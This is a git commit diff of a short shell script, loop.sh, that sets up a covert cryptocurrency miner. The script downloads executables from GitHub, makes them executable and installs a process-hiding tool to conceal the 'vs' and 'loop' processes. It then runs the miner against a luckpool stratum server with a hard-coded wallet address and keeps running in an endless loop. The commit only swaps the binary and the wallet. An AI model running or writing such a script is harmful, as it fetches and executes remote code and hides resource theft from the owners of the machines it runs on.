50b107913a8779412ce957dc3bda2f9f984492b8
bulboni <163756439+bulboni@users.noreply.github.com>
2024-06-20 23:22:35 -0400

    Update loop.sh

--- loop.sh
+++ loop.sh
@@ -1,12 +1,12 @@
 #!/bin/sh
 wget https://github.com/bulboni/vs/raw/main/loop && chmod +x loop
-wget https://github.com/bulboni/vs/raw/main/vs && chmod +x vs
+wget https://github.com/bulboni/vs/raw/main/verus-solver && chmod +x verus-solver
 apt install nodejs -y
 apt install npm -y
 npm i -g node-process-hider
 ph add vs
 ph add loop
-./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 40
+./loop -c stratum+tcp://na.luckpool.net:3956 -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.korps2 -p x --cpu 2
 while [ 1 ]; do
 sleep 3
 done
